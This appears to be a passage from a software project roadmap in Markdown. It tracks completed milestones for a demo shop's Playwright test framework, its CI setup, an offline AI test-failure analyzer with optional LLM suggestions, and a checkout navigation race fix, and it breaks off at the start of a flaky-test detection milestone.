```text
P1-M1 Project Foundation
 └── P1-M2 Layout & Routing
      ├── P1-M3 Product Catalogue
      │    ├── P1-M4 Product Details
      │    └── P1-M8 Home & Featured Products
      └── P1-M5 Shopping Cart
           └── P1-M6 Fake Authentication
                └── P1-M7 Checkout Flow
                     └── P1-M9 Error & Empty States
                          └── P1-M10 Accessibility & Testability Polish
```

---

## Phase 1 — Progress Summary

| Milestone | Status | Completed |
|---|---|---|
| P1-M1 — Project Foundation | ✅ Completed | 2026-07-06 |
| P1-M2 — Application Layout and Routing | ✅ Completed | 2026-07-06 |
| P1-M3 — Product Catalogue | ✅ Completed | 2026-07-06 |
| P1-M4 — Product Details | ✅ Completed | 2026-07-06 |
| P1-M5 — Shopping Cart | ✅ Completed | 2026-07-06 |
| P1-M6 — Fake Authentication | ✅ Completed | 2026-07-06 |
| P1-M7 — Checkout Flow | ✅ Completed | 2026-07-06 |
| P1-M8 — Home Page and Featured Products | ✅ Completed | 2026-07-06 |
| P1-M9 — Error and Empty States | ✅ Completed | 2026-07-06 |
| P1-M10 — Accessibility and Testability Polish | ✅ Completed | 2026-07-06 |

---

# Phase 2 — Playwright Testing Framework

Build a production-inspired Playwright testing framework against the completed demo shop. Phase 1 delivered **59 passing smoke tests** in `tests/smoke/`; Phase 2 refactors those tests into a maintainable framework and adds E2E suites, reporting, and CI.

**Phase 2 status:** ✅ Completed  
**Phase 2 started:** 2026-07-06  
**Phase 2 completed:** 2026-07-15

---

## Shared Conventions (Phase 2)

| Topic | Decision |
|---|---|
| **Test location** | `tests/` at repo root (unchanged) |
| **Folder layout** | `pages/`, `fixtures/`, `data/`, `smoke/`, `e2e/` |
| **Page Object Model** | One page class per app route/screen; locators live in page objects |
| **Locator priority** | Same as app: `getByRole` → `getByLabel` → stable text → `data-testid` |
| **Fixtures** | `auth` (logged-in session), `cart` (preloaded cart), composable with POM |
| **Test data** | `tests/data/` mirrors app credentials and sample products (single source for tests) |
| **Tags** | `@smoke`, `@e2e`, `@auth`, `@cart` via `test.describe` / `grep` |
| **Artifacts** | Traces on first retry; screenshots and videos on failure |
| **CI** | GitHub Actions on push/PR; upload HTML report and failure artifacts |
| **Naming** | Spec files: `kebab-case.spec.ts`; page objects: `PascalCase` + `Page` suffix |

---

## P2-M1 — Framework Foundation and Folder Structure

**Status:** ✅ Completed  
**Completed:** 2026-07-07  
**Dependencies:** Phase 1 complete

### Goal

Establish the Playwright framework folder structure, enhanced configuration, and npm scripts so subsequent milestones have a consistent foundation.

### Implementation scope

- Create `tests/pages/`, `tests/fixtures/`, `tests/data/`
- Enhance `playwright.config.ts` (output dirs, `screenshot`, `video`, reporter list)
- Add TypeScript config for tests if needed (`tests/tsconfig.json` or extend root)
- Add npm scripts: `test:smoke`, `test:e2e` (e2e may be empty initially)
- Document framework conventions in `docs/LESSONS_LEARNED.md` or new `docs/TESTING.md`

### User scenarios

- Developer clones repo and understands where tests, page objects, and fixtures live.
- Developer runs `npm test` and existing smoke tests still pass unchanged.
- Developer runs `npm run test:smoke` to execute only smoke-tagged tests (once tags added in P2-M5).

### Future Playwright test scenarios

| ID | Scenario |
|---|---|
| P2-M1-01 | `npm test` runs all existing smoke specs successfully |
| P2-M1-02 | Framework folders exist with documented purpose |
| P2-M1-03 | `playwright.config.ts` captures failure screenshots |

### Acceptance criteria

- [x] Folder structure `pages/`, `fixtures/`, `data/` created
- [x] Playwright config enhanced for artifacts
- [x] All 59 Phase 1 smoke tests still pass
- [x] Framework conventions documented

### Completion checklist

- [x] `tests/pages/` directory
- [x] `tests/fixtures/` directory
- [x] `tests/data/` directory
- [x] Enhanced `playwright.config.ts`
- [x] npm scripts for suite filtering
- [x] Documentation updated
- [x] Roadmap updated with completion summary

### Implementation notes

Summary:

- Added framework directories: `tests/pages/`, `tests/fixtures/`, and `tests/data/` with starter README guidance.
- Enhanced Playwright config for artifacts and reporting (`outputDir`, `screenshot`, `video`, multi-reporter list).
- Added test scripts for suite targeting (`test:smoke`, `test:e2e` with pass-when-empty behavior).
- Added `tests/tsconfig.json` for future framework TypeScript files.
- Documented framework conventions in `docs/TESTING.md`.

Architectural decisions:

- Kept existing smoke tests unchanged while laying the foundation for phased migration in P2-M2 through P2-M5.
- Chose `test:e2e` based on `@e2e` tags to align with milestone plan and avoid hard-coding folder assumptions early.

---

## P2-M2 — Page Object Model

**Status:** ✅ Completed  
**Completed:** 2026-07-07  
**Dependencies:** P2-M1

### Goal

Introduce Page Object Model classes that encapsulate locators and common actions for each major app screen.

### Implementation scope

- Create `BasePage` with shared navigation helpers (go to Products, Cart, Login, etc.)
- Create page objects: `HomePage`, `ProductsPage`, `ProductDetailPage`, `CartPage`, `LoginPage`, `CheckoutPage`, `OrderConfirmationPage`, `NotFoundPage`
- Locators use `getByRole` / `getByLabel` per Phase 1 conventions
- Refactor 2–3 smoke specs as reference implementations (full migration in P2-M5)

### User scenarios

- Tester updates a locator in one page object instead of across multiple spec files.
- New specs read as user journeys (`productsPage.addToCart(name)`) rather than raw selectors.

### Future Playwright test scenarios

| ID | Scenario |
|---|---|
| P2-M2-01 | `ProductsPage` adds item to cart via page object |
| P2-M2-02 | `LoginPage` performs login via page object |
| P2-M2-03 | `BasePage` navigation helpers reach all major routes |

### Locator strategy

- All locators defined inside page object classes as getters or private fields
- No CSS/XPath selectors in spec files
- Reuse app `data-testid` values only inside page objects when semantic locators are insufficient

### Acceptance criteria

- [x] `BasePage` and all major page objects implemented
- [x] At least 2 smoke specs refactored to use POM
- [x] No duplicate locator strings across refactored specs
- [x] All tests still pass

### Completion checklist

- [x] `BasePage` component
- [x] Page objects for all major routes
- [x] Reference spec refactors
- [x] Roadmap updated with completion summary

### Implementation notes

Summary:

- Added `BasePage` plus page objects for all major routes: Home, Products, Product Detail, Cart, Login, Checkout, Order Confirmation, and Not Found.
- Refactored three smoke specs as reference implementations: `app-layout.spec.ts`, `product-catalogue.spec.ts`, and `authentication.spec.ts`.
- Centralized navigation, form, and cart interactions in page object methods while keeping assertions in specs.

Architectural decisions:

- Page objects expose locators as getters and user actions as methods; specs retain `expect` assertions for readability.
- Used `getByRole` / `getByLabel` throughout; `data-testid` only in `CartPage` and `OrderConfirmationPage` where semantic alternatives are weaker.
- Left remaining smoke specs unchanged for full POM migration in P2-M5.

---

## P2-M3 — Centralized Test Data

**Status:** ✅ Completed  
**Completed:** 2026-07-08  
**Dependencies:** P2-M1

### Goal

Provide a single test data module for credentials, products, checkout details, and URLs used across all suites.

### Implementation scope

- Create `tests/data/users.ts`, `tests/data/products.ts`, `tests/data/checkout.ts`
- Export constants aligned with `app/src/data/` (e.g. `standard_user` / `secret123`)
- Add helper for sample product slug/name used in cart and checkout tests
- Replace inline test data in smoke specs (during P2-M5 migration)

### User scenarios

- Tester changes demo credentials in one file when app data changes.
- E2E specs import shared checkout details instead of duplicating objects.

### Future Playwright test scenarios

| ID | Scenario |
|---|---|
| P2-M3-01 | Test data exports valid user credentials |
| P2-M3-02 | Test data exports at least one product slug and name |
| P2-M3-03 | Checkout test data matches form field labels |

### Acceptance criteria

- [x] Centralized test data modules created
- [x] Data aligned with app JSON sources
- [x] Documented import pattern for specs

### Completion checklist

- [x] `tests/data/users.ts`
- [x] `tests/data/products.ts`
- [x] `tests/data/checkout.ts`
- [x] `tests/data/index.ts` barrel export (optional)
- [x] Roadmap updated with completion summary

### Implementation notes

Summary:

- Added centralized test data modules for users, products, and checkout flows under `tests/data/`, plus a barrel export in `tests/data/index.ts`.
- Kept data aligned with app sources (`app/src/data/products.json` and `standard_user` / `secret123` credentials used in Phase 1 smoke specs).
- Left smoke specs using inline literals for now; migration to shared data is scheduled for P2-M5.

Architectural decisions:

- Test data modules expose small, focused exports (e.g. `validUser`, `sampleProduct`, `validCheckoutDetails`) to keep imports explicit in specs.
- Centralized error-case data (like `checkoutFieldErrors`) mirrors existing spec usage to make future refactors mechanical.

---

## P2-M4 — Auth and Cart Fixtures

**Status:** ✅ Completed  
**Completed:** 2026-07-08  
**Dependencies:** P2-M2, P2-M3

### Goal

Create Playwright fixtures that provide authenticated sessions and preloaded carts to reduce setup boilerplate in specs.

### Implementation scope

- Create `tests/fixtures/auth.fixture.ts` — logged-in `page` fixture
- Create `tests/fixtures/cart.fixture.ts` — page with item(s) in cart
- Compose fixtures with page objects where appropriate
- Optional: `storageState` for faster auth reuse
- Add example specs demonstrating fixture usage

### User scenarios

- Tester writes checkout spec with `loggedInPage` fixture instead of manual login steps.
- Tester writes cart spec with `cartWithItem` fixture instead of manual add-to-cart navigation.

### Future Playwright test scenarios

| ID | Scenario |
|---|---|
| P2-M4-01 | Auth fixture provides logged-in session |
| P2-M4-02 | Cart fixture provides cart with one item |
| P2-M4-03 | Fixtures compose with existing page objects |

### Acceptance criteria

- [x] Auth fixture logs in via UI or storage state
- [x] Cart fixture preloads cart via UI
- [x] Example specs use fixtures successfully
- [x] Fixtures documented with usage examples

### Completion checklist

- [x] `auth` fixture implemented
- [x] `cart` fixture implemented
- [x] Custom `test` export from `tests/fixtures/index.ts`
- [x] Example fixture specs
- [x] Roadmap updated with completion summary

### Implementation notes

Summary:

- Added `loggedInPage` and `cartWithItem` fixtures using Playwright `test.extend` and `mergeTests`.
- Exported reusable helpers `loginViaUi` and `addSampleProductToCart` for gradual adoption in smoke specs.
- Added `tests/fixtures/fixtures.spec.ts` with P2-M4-01 through P2-M4-03 example scenarios composing fixtures with page objects.

Architectural decisions:

- Used UI-based setup (not `storageState`) to keep fixture behavior aligned with real user flows and existing smoke tests.
- Kept smoke specs unchanged; fixture adoption across the suite is scheduled for P2-M5.

---

## P2-M5 — Smoke Suite Refactor and Tags

**Status:** ✅ Completed  
**Completed:** 2026-07-09  
**Dependencies:** P2-M2, P2-M3, P2-M4

### Goal

Migrate all 59 Phase 1 smoke tests to use page objects, shared test data, and fixtures where appropriate; introduce `@smoke` tags.

### Implementation scope

- Refactor all specs in `tests/smoke/` to use POM and `tests/data/`
- Apply fixtures to auth/cart/checkout specs where they reduce noise
- Tag smoke suite with `@smoke` (via title or `grep` config)
- Ensure `npm run test:smoke` runs only smoke tests
- Remove duplicated helpers across spec files

### User scenarios

- Developer runs `npm run test:smoke` for a fast confidence check before commit.
- Smoke specs are readable and maintainable with no raw locators in spec bodies.

### Future Playwright test scenarios

| ID | Scenario |
|---|---|
| P2-M5-01 | All 59 smoke tests pass after POM migration |
| P2-M5-02 | `npm run test:smoke` executes smoke suite only |
| P2-M5-03 | No duplicate login/add-to-cart helpers in spec files |

### Acceptance criteria

- [x] All smoke specs use page objects
- [x] Shared test data used consistently
- [x] `@smoke` tag/filter works
- [x] 59 tests passing

### Completion checklist

- [x] All `tests/smoke/*.spec.ts` refactored
- [x] Fixtures applied where beneficial
- [x] `test:smoke` npm script verified
- [x] Roadmap updated with completion summary

### Implementation notes

Summary:

- Refactored all 10 smoke spec files to use page objects, shared test data from `tests/data/`, and fixture helpers for auth/cart setup.
- Tagged every smoke describe block with `@smoke` and updated `npm run test:smoke` to filter by tag.
- Removed duplicated inline credentials, product imports, and login/add-to-cart helpers from smoke specs.

Architectural decisions:

- Smoke specs continue using the default Playwright `test` with fixture helper functions rather than fixture-injected pages, keeping migration incremental while eliminating duplication.
- Left `runPurchaseHappyPath` local to accessibility specs as a journey helper built from page objects.

---

## P2-M6 — E2E Journey Suites

**Status:** ✅ Completed  
**Completed:** 2026-07-10  
**Dependencies:** P2-M5

### Goal

Add dedicated end-to-end journey specs that exercise full user flows across multiple pages, tagged `@e2e`.

### Implementation scope

- Create `tests/e2e/` directory
- Implement journeys: guest browse → login → purchase, returning customer checkout, cart management flow
- Add desktop (1280px) and mobile (375px) viewport coverage for primary journey
- Tag with `@e2e`; add `npm run test:e2e`
- Reuse POM, fixtures, and test data throughout

### User scenarios

- Tester runs `npm run test:e2e` before a release for full journey confidence.
- CI runs smoke on every push and e2e on PR merge (configured in P2-M8).

### Future Playwright test scenarios

| ID | Scenario |
|---|---|
| P2-M6-01 | Full purchase journey on desktop |
| P2-M6-02 | Full purchase journey on mobile viewport |
| P2-M6-03 | Guest redirected to login when accessing checkout |
| P2-M6-04 | Cart persistence across navigation |

### Acceptance criteria

- [x] `tests/e2e/` suite with at least 4 journey specs
- [x] `@e2e` tag/filter works
- [x] Desktop and mobile coverage for primary journey
- [x] All e2e tests pass

### Completion checklist

- [x] `tests/e2e/` directory and specs
- [x] `test:e2e` npm script
- [x] Mobile viewport project or per-test viewport
- [x] Roadmap updated with completion summary

### Implementation notes

Summary:

- Added `tests/e2e/` with four journey spec files and a shared `completeGuestPurchaseJourney` helper.
- Implemented P2-M6-01 through P2-M6-04 scenarios plus a returning-customer checkout journey.
- Desktop (1280px) and mobile (375px) viewport coverage for the primary guest purchase flow.

Architectural decisions:

- Used per-test viewport sizing for mobile coverage instead of a separate Playwright project, keeping the config simple until CI matrix needs grow in P2-M8.
- Extracted the guest purchase flow into `tests/e2e/helpers/purchase-journey.ts` to avoid duplicating the smoke checkout E2E steps.

---

## P2-M7 — Reporting, Traces, and Debug Artifacts

**Status:** ✅ Completed  
**Completed:** 2026-07-10  
**Dependencies:** P2-M1

### Goal

Configure rich failure artifacts and document the debugging workflow to support manual investigation and future AI Failure Analyzer (Phase 3).

### Implementation scope

- Configure `trace`, `screenshot`, `video` policies in `playwright.config.ts`
- Add `list` reporter for CI logs alongside `html`
- Document trace viewer workflow (`npx playwright show-trace`)
- Ensure `test-results/` and `playwright-report/` outputs are predictable
- Optional: `playwright.config.ts` `outputDir` organization

### User scenarios

- Tester opens HTML report after a failed run and inspects screenshots.
- Tester opens trace file to step through a failed E2E journey.
- Phase 3 AI module can rely on consistent artifact paths.

### Future Playwright test scenarios

| ID | Scenario |
|---|---|
| P2-M7-01 | Failed test produces screenshot in `test-results/` |
| P2-M7-02 | Retried test produces trace file |
| P2-M7-03 | `npm run report` opens HTML report |

### Acceptance criteria

- [x] Screenshot on failure configured
- [x] Video on failure configured (or retain-on-failure)
- [x] Trace strategy documented
- [x] Debugging workflow documented

### Completion checklist

- [x] Artifact config in `playwright.config.ts`
- [x] CI-friendly reporter setup
- [x] Debugging docs updated
- [x] Roadmap updated with completion summary

### Implementation notes

Summary:

- Documented artifact policy in `playwright.config.ts` with explicit `outputDir` and `playwright-report` HTML output folder.
- Added `npm run trace` script for opening trace files; updated `npm run report` to target `playwright-report/` explicitly.
- Expanded debugging workflow in `docs/TESTING.md` and `README.md` (HTML report, trace viewer, UI/headed modes, error context files).

Architectural decisions:

- Kept `trace: 'on-first-retry'` paired with CI retries rather than `retain-on-failure` for all traces, balancing artifact size with debuggability.
- Stable artifact paths (`test-results/`, `playwright-report/`) documented for Phase 3 AI Failure Analyzer consumption.

---

## P2-M8 — GitHub Actions CI

**Status:** ✅ Completed  
**Completed:** 2026-07-15  
**Dependencies:** P2-M5, P2-M7

### Goal

Run Playwright tests automatically on GitHub Actions with artifact upload for reports and failure debugging.

### Implementation scope

- Create `.github/workflows/playwright.yml`
- Run on `push` to `main` and on `pull_request`
- Use Node 22, `npm run setup`, `npm test` (or `test:smoke` + `test:e2e`)
- Upload `playwright-report/` and `test-results/` as artifacts on failure
- Set `CI=true` for Playwright config (fresh webServer, retries)
- Update README with CI badge and status

### User scenarios

- Contributor opens PR and sees Playwright check pass or fail.
- Reviewer downloads HTML report artifact from failed CI run.

### Future Playwright test scenarios

| ID | Scenario |
|---|---|
| P2-M8-01 | CI workflow runs on pull request |
| P2-M8-02 | CI uploads report artifact on failure |
| P2-M8-03 | CI uses Node 22 and project-local browsers |

### Acceptance criteria

- [x] GitHub Actions workflow runs successfully
- [x] Smoke (and e2e) tests pass in CI
- [x] Artifacts uploaded on failure
- [x] README documents CI behavior

### Completion checklist

- [x] `.github/workflows/playwright.yml`
- [x] Artifact upload configured
- [x] README CI section updated
- [x] Phase 2 completion summary written in this document
- [x] Roadmap updated with completion summary

### Implementation notes

Summary:

- Added `.github/workflows/playwright.yml` with parallel matrix jobs for `test:smoke` and `test:e2e`.
- CI uses Node 22 from `.nvmrc`, `npm run setup`, Playwright system deps, and `CI=true` for config-aligned runs.
- Failure artifacts (`playwright-report/`, `test-results/`) uploaded per matrix job.
- README badge and CI documentation added.

Architectural decisions:

- Split smoke and e2e into parallel matrix jobs for faster feedback and clearer failure attribution.
- Installed `playwright install-deps` in CI only (Linux system libraries) without changing local setup scripts.

---

## Phase 2 — Milestone Dependency Graph

```text
Phase 1 Demo Shop (complete)
 └── P2-M1 Framework Foundation
      ├── P2-M2 Page Object Model ────────┐
      ├── P2-M3 Centralized Test Data ──┤
      │    └── P2-M4 Auth & Cart Fixtures
      │         └── P2-M5 Smoke Refactor & Tags
      │              └── P2-M6 E2E Journey Suites
      └── P2-M7 Reporting & Artifacts
           └── P2-M8 GitHub Actions CI (also depends P2-M5)
```

---

## Phase 2 — Progress Summary

| Milestone | Status | Completed |
|---|---|---|
| P2-M1 — Framework Foundation and Folder Structure | ✅ Completed | 2026-07-07 |
| P2-M2 — Page Object Model | ✅ Completed | 2026-07-07 |
| P2-M3 — Centralized Test Data | ✅ Completed | 2026-07-08 |
| P2-M4 — Auth and Cart Fixtures | ✅ Completed | 2026-07-08 |
| P2-M5 — Smoke Suite Refactor and Tags | ✅ Completed | 2026-07-09 |
| P2-M6 — E2E Journey Suites | ✅ Completed | 2026-07-10 |
| P2-M7 — Reporting, Traces, and Debug Artifacts | ✅ Completed | 2026-07-10 |
| P2-M8 — GitHub Actions CI | ✅ Completed | 2026-07-15 |

**Phase 2 status: ✅ Complete** — all 8 milestones delivered (2026-07-07 through 2026-07-15).

### Phase 2 — Completion Summary

Phase 2 transformed the Phase 1 inline smoke suite into a production-inspired Playwright framework:

- **Framework structure** — `tests/pages/`, `tests/fixtures/`, `tests/data/`, `tests/e2e/`
- **Page Object Model** — 9 page objects covering all major routes
- **Centralized test data** — users, products, checkout constants
- **Fixtures** — `loggedInPage`, `cartWithItem`, and reusable setup helpers
- **Tagged suites** — `@smoke` (59 tests), `@e2e` (6 tests), filterable npm scripts
- **Artifacts** — screenshots, video, traces on failure; documented debugging workflow
- **CI** — GitHub Actions matrix for smoke + e2e with artifact upload

**Total tests:** 68 (59 smoke + 6 e2e + 3 fixture examples). Ready for Phase 3 AI Test Inspector.

---

# Phase 3 — AI Test Inspector

**Status:** ✅ Completed — P3-M1 through P3-M5  
**Completed:** 2026-07-18  
**Current focus:** —

### Goal

Build AI-assisted testing tools that consume Playwright artifacts (`test-results/`) and generate actionable investigation insights.

### Design principles

- **Deterministic first** — collect and classify without an LLM so behaviour is testable and works offline
- **Optional LLM later** — provider interface for root-cause suggestions when an API key is present
- **Stable inputs** — rely on P2-M7 artifact paths (`test-results/`, `error-context.md`, screenshots, traces)
- **No backend** — CLI + local Node scripts only

### Planned modules (high-level)

- AI Failure Analyzer (artifacts → structured context → report)
- Heuristic failure classification
- Structured Markdown investigation reports
- Optional LLM root-cause suggestions
- Future: flaky detection, locator suggestions, PR summaries

---

## P3-M1 — Failure Artifact Ingestion and CLI Scaffold

**Status:** ✅ Completed  
**Completed:** 2026-07-17  
**Dependencies:** Phase 2 complete (P2-M7 artifact layout)

### Goal

Create a local CLI that collects Playwright failure artifacts from a `test-results/` folder into a normalized JSON context object for later classification and reporting.

### Implementation scope

- Create `ai/failure-analyzer/` with TypeScript modules (`types`, `collect`, `cli`)
- Discover screenshots, videos, traces, and `error-context.md` under a given failure directory
- Emit normalized JSON to stdout (and optional `--out` file)
- Add npm scripts: `analyze:failure`, `test:ai`
- Add golden fixtures under `ai/failure-analyzer/fixtures/` for unit tests
- Document usage in `ai/failure-analyzer/README.md` and `docs/TESTING.md`

### User scenarios

- Developer points the CLI at a failed test folder and receives structured JSON of available artifacts.
- Developer runs unit tests for the collector without needing Playwright browsers.

### Future test scenarios

| ID | Scenario |
|---|---|
| P3-M1-01 | Collector finds screenshot, video, error-context, and trace paths in a fixture folder |
| P3-M1-02 | Collector returns empty lists gracefully for a folder with no artifacts |
| P3-M1-03 | CLI exits non-zero when the target path does not exist |

### Acceptance criteria

- [x] Collector returns normalized `FailureContext` JSON
- [x] CLI script works against fixture and real `test-results/` paths
- [x] Unit tests cover happy path and missing-path edge cases
- [x] Usage documented

### Completion checklist

- [x] `ai/failure-analyzer/` modules
- [x] Fixtures + unit tests
- [x] npm scripts
- [x] Docs updated
- [x] Roadmap updated with completion summary

### Implementation notes

Summary:

- Added `ai/failure-analyzer/` with `collectFailureContext()`, CLI entrypoint, golden fixtures, and Node test suite (`npm run test:ai`).
- CLI supports `--out <file.json>` and prints normalized artifact paths plus `errorContextText`.

Architectural decisions:

- Used `.mts` ESM modules instead of root `"type": "module"` so Playwright can continue importing JSON test data without import attributes.
- Kept the collector deterministic and offline — classification/reporting deferred to P3-M2/P3-M3.

---

## P3-M2 — Heuristic Failure Classification

**Status:** ✅ Completed  
**Completed:** 2026-07-17  
**Dependencies:** P3-M1

### Goal

Classify failures into stable categories using deterministic heuristics on error text and artifact signals (no LLM).

### Implementation scope

- Categories: `assertion`, `timeout`, `locator`, `network`, `auth`, `unknown`
- Score confidence from keyword/signal matches
- Attach classification to `FailureContext`
- Unit tests with fixture error snippets

### Acceptance criteria

- [x] Classifier returns category + confidence
- [x] Known fixture errors map to expected categories
- [x] Unknown errors fall back to `unknown`

### Implementation notes

Summary:

- Added `classifyFailure()` with ordered heuristic rules and confidence scores.
- Wired classification into `collectFailureContext()` so CLI JSON always includes `classification`.
- Added 7 unit tests covering all categories plus missing-error-text fallback.

Architectural decisions:

- Highest-confidence matching rule wins when multiple signals appear (e.g. expect + Timeout → assertion).
- Kept classification fully offline and deterministic for portfolio reliability before optional LLM (P3-M4).

---

## P3-M3 — Markdown Investigation Report Generator

**Status:** ✅ Completed  
**Completed:** 2026-07-17  
**Dependencies:** P3-M1, P3-M2

### Goal

Generate a structured Markdown investigation report from collected context and classification.

### Implementation scope

- Report sections: summary, classification, artifacts, suggested next steps
- Write report to `ai-reports/` (gitignored) or `--out` path
- npm script: `analyze:report`

### Acceptance criteria

- [x] Report includes classification and artifact links
- [x] Suggested steps vary by category
- [x] Unit tests assert required sections

### Implementation notes

Summary:

- Added `generateMarkdownReport()` with summary, classification, artifacts, error excerpt, and category-specific next steps.
- Added `npm run analyze:report` CLI that collects, classifies, and writes Markdown (default `ai-reports/<folder>.md`).
- Added 3 unit tests for required sections, category-specific guidance, and empty-artifact handling.

Architectural decisions:

- Reports are plain Markdown for easy review in GitHub and future Phase 3 LLM augmentation.
- Default output directory `ai-reports/` is gitignored; `--out` overrides for CI or local inspection.

---

## P3-M3b — HTML Investigation Reports

**Status:** ✅ Completed  
**Completed:** 2026-07-17  
**Dependencies:** P3-M3

### Goal

Offer a self-contained HTML investigation report alongside Markdown for local review and CI artifacts.

### Implementation scope

- `generateHtmlReport(context)` — semantic HTML, escaped excerpts, same sections as Markdown
- CLI `--format md|html|both` (default `md`)
- Default output `ai-reports/<folder>.html` when `--format html`

### Acceptance criteria

- [x] HTML includes summary, classification, artifacts, and next steps
- [x] Suggested steps vary by category
- [x] Error text is HTML-escaped
- [x] Unit tests cover HTML sections and escaping

### Implementation notes

Summary:

- Added self-contained HTML report generator with accessible landmarks and category badge.
- Extended `analyze:report` with `--format md|html|both`; `both` writes Markdown + HTML into a directory.
- Added 4 unit tests (sections, category steps, empty artifacts, HTML escaping).

Architectural decisions:

- Markdown remains the default for GitHub-friendly diffs; HTML is opt-in for browser review.
- No new dependencies — template string + `escapeHtml` keeps the analyzer offline and portable.

---

## P3-M4 — Optional LLM Root-Cause Suggestions

**Status:** ✅ Completed  
**Completed:** 2026-07-18  
**Dependencies:** P3-M3

### Goal

Add an optional LLM provider interface that enhances reports with root-cause suggestions when configured; fall back to heuristic report when not.

### Implementation scope

- Provider interface (`suggestRootCause(context)`)
- Env-based opt-in (e.g. `OPENAI_API_KEY` or `ANTHROPIC_API_KEY`) — never required
- Prompt template constrained by `docs/AI_GUIDELINES.md`
- No secrets committed

### Acceptance criteria

- [x] Works offline without API keys
- [x] With provider mocked, suggestions appear in report
- [x] Provider interface is swappable

### Implementation notes

Summary:

- Added `LlmProvider` interface with OpenAI and Anthropic implementations (injectable `fetch` for tests).
- `resolveProviderFromEnv()` returns a provider only when a key is present; otherwise reports stay heuristic-only.
- Reports gain an optional **AI root-cause suggestions** section; CLI supports `--llm` / `--no-llm`.
- Prompt rules documented under Failure Analyzer in `docs/AI_GUIDELINES.md`.

Architectural decisions:

- LLM is opt-in via environment keys — no network calls and no report section when offline.
- Provider failures warn and continue so investigation reports remain usable without an API.
- JSON response shape keeps Markdown/HTML rendering deterministic once suggestions arrive.

---

## P3-M5 — Analyzer Integration and Documentation Polish

**Status:** ✅ Completed  
**Completed:** 2026-07-18  
**Dependencies:** P3-M3 (P3-M4 optional)

### Goal

Polish end-to-end CLI UX, README/AI module docs, and optional CI hook notes for using the analyzer on downloaded failure artifacts.

### Implementation scope

- End-to-end CLI flow documented
- README AI Modules section updated with real commands
- Phase 3 progress summary in roadmap

### Acceptance criteria

- [x] Documented one-command analyze flow
- [x] Sample report checked into docs or fixtures (sanitized)
- [x] Phase 3 milestones marked complete where delivered

### Implementation notes

Summary:

- Documented one-command `analyze:report --format both` flow in README and analyzer README.
- Added sanitized sample at `docs/samples/failure-investigation-report.md`.
- Documented CI artifact download → local analyze workflow in `docs/TESTING.md`.
- Added GitHub Actions `ai-unit` job running `npm run test:ai` on every push/PR.

Architectural decisions:

- Keep LLM off CI by default (no secrets required); engineers opt in locally with API keys.
- Check in a sanitized Markdown sample; HTML remains generated locally under gitignored `ai-reports/`.

---

## Phase 3 — Milestone Dependency Graph

```text
Phase 2 complete
 └── P3-M1 Failure Artifact Ingestion
      └── P3-M2 Heuristic Classification
           └── P3-M3 Markdown Report Generator
                ├── P3-M3b HTML Investigation Reports
                ├── P3-M4 Optional LLM Suggestions
                └── P3-M5 Integration & Docs Polish
```

---

## Phase 3 — Progress Summary

| Milestone | Status | Completed |
|---|---|---|
| P3-M1 — Failure Artifact Ingestion and CLI Scaffold | ✅ Completed | 2026-07-17 |
| P3-M2 — Heuristic Failure Classification | ✅ Completed | 2026-07-17 |
| P3-M3 — Markdown Investigation Report Generator | ✅ Completed | 2026-07-17 |
| P3-M3b — HTML Investigation Reports | ✅ Completed | 2026-07-17 |
| P3-M4 — Optional LLM Root-Cause Suggestions | ✅ Completed | 2026-07-18 |
| P3-M5 — Analyzer Integration and Documentation Polish | ✅ Completed | 2026-07-18 |

**Phase 3 status: ✅ Complete** — all milestones delivered (2026-07-17 through 2026-07-18).

### Phase 3 — Completion Summary

Phase 3 delivered a local, offline-first AI Failure Analyzer that consumes Playwright artifacts:

- **Ingestion** — `collectFailureContext()` + `analyze:failure` CLI
- **Classification** — heuristic categories with confidence scoring
- **Reports** — Markdown and self-contained HTML (embedded screenshots, cleaned error excerpts)
- **Optional LLM** — swappable OpenAI/Anthropic providers; never required
- **Docs & CI** — one-command flow, sanitized sample report, `test:ai` job, CI artifact analyze notes

**Commands:** `npm run test:ai`, `npm run analyze:failure`, `npm run analyze:report`.

---

# Phase 4 — Reliability & Flaky Detection

**Status:** ✅ Completed — P4-M1 through P4-M2  
**Completed:** 2026-07-20  
**Current focus:** —

### Goal

Improve suite reliability by fixing a known checkout navigation race, then add a local flaky-test detection tool that analyzes Playwright JSON/retry history.

### Design principles

- Prefer app-side race fixes over arbitrary test waits
- Keep flaky detection offline and deterministic (no LLM required)
- Reuse Playwright artifacts / report JSON already produced in Phase 2–3

---

## P4-M1 — Fix Checkout Place-Order Navigation Race

**Status:** ✅ Completed  
**Completed:** 2026-07-20  
**Dependencies:** Phase 1 checkout flow

### Goal

Stop intermittent failures where Place order leaves the browser on `/checkout` instead of `/order-confirmation`.

### User scenarios

1. Authenticated shopper with items in cart submits a valid checkout form and always lands on order confirmation.
2. After a successful order, cart is empty when visiting `/cart`.
3. Invalid checkout form still stays on `/checkout` with validation errors.

### Future Playwright test cases

| ID | Scenario |
|---|---|
| P4-M1-01 | Happy path Place order reaches `/order-confirmation` (existing P1-M7-01) |
| P4-M1-02 | Cart empty after successful order (existing P1-M7-06) |
| P4-M1-03 | Validation failure stays on `/checkout` (existing negative tests) |

### Accessibility requirements

- Unchanged: Place order remains a labeled submit button; confirmation keeps a single `h1`.

### Stable locator strategy

- `getByRole('button', { name: 'Place order' })`
- `getByRole('heading', { name: 'Order confirmed' })`
- URL assertion `/order-confirmation`

### Edge cases

- Cart clear must not race with navigation
- Direct visit to confirmation without an order still redirects to `/cart`
- Validation submit must not wait for confirmation URL

### Implementation scope

- Navigate to confirmation before clearing cart (clear on confirmation mount)
- Remove `isCompletingOrderRef` workaround no longer needed
- Harden POM `placeOrder({ waitForConfirmation: true })` for happy paths only

### Acceptance criteria

- [x] Place order navigates before clearing cart
- [x] Cart still clears after successful order (badge reaches 0)
- [x] Happy-path tests wait for confirmation URL (+ empty cart badge) in POM
- [x] Smoke checkout / accessibility / error-empty related tests pass

### Implementation notes

Summary:

- Reordered checkout submit to `saveOrder` → `navigate('/order-confirmation')` → `clearCart()`.
- Kept `isCompletingOrderRef` so an empty-cart re-render cannot bounce to `/cart` mid-transition.
- Extended `CheckoutPage.placeOrder({ waitForConfirmation: true })` to wait for confirmation URL and `Cart, 0 items`.

Architectural decisions:

- App-side ordering fix preferred over arbitrary test sleeps.
- Validation paths keep click-only `placeOrder()` so they do not wait for confirmation.

---

## P4-M2 — Flaky Test Detection CLI

**Status:** ✅ Completed  
**Completed:** 2026-07-20  
**Dependencies:** P4-M1 (preferred), Phase 2 report JSON

### Goal

Add a local CLI that analyzes Playwright JSON reports (and/or retry outcomes) to flag likely flaky tests.

### User scenarios

1. After a suite run with retries, engineer runs one command and sees which tests passed only after retry.
